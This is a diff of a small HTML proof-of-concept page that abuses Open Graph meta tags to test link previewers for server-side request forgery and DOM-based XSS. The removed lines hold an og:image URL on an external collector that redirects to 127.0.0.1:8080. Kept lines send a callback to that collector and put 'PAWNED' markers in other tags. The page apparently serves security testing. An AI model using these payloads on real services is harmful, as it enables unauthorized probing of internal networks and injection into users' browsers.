@@ -4,25 +4,17 @@
   <meta charset="utf-8">
   <title>OG SSRF + XSS PoC</title>
 
-  <!-- SSRF proof: backend should fetch this URL to size the image -->
-  <!-- <meta property="og:image" content="https://eoqe27iokvrulpo.m.pipedream.net/hit.png?cb=2025-08-29T20:18:15Z"> -->
-   <meta property="og:image"
-      content="https://eoqe27iokvrulpo.m.pipedream.net/redirect?to=http%3A%2F%2F127.0.0.1%3A8080%2F&cb=redir-localhost-8080">
+  <!-- BE will fetch this URL to size the image -->
+  <meta property="og:image" content="https://eoqe27iokvrulpo.m.pipedream.net/hit.png?cb=2025-08-29T20:18:15Z">
 
-  <!-- Optional: add a large image to test timeouts/DoS behavior -->
-  <!-- <meta property="og:image" content="https://eoqe27iokvrulpo.m.pipedream.net/huge.jpg"> -->
-
-  <!-- DOM-XSS test (only pops if your previewer injects innerHTML unsafely) -->
   <meta property="og:title" content="PAWNED-title">
   <meta property="og:description" content="PAWNED-description">
 
-  <!-- Make URLs absolute in case the previewer resolves relative links -->
   <meta property="og:url" content="PAWNED-url">
-  <meta property="og:site_name" content="PAWNED-site_name">
+  
 </head>
 <body>
   <h1>OG SSRF + XSS PoC</h1>
-  <p>This page is intentionally simple. All magic is in the OG tags.</p>
 </body>
 </html>
 
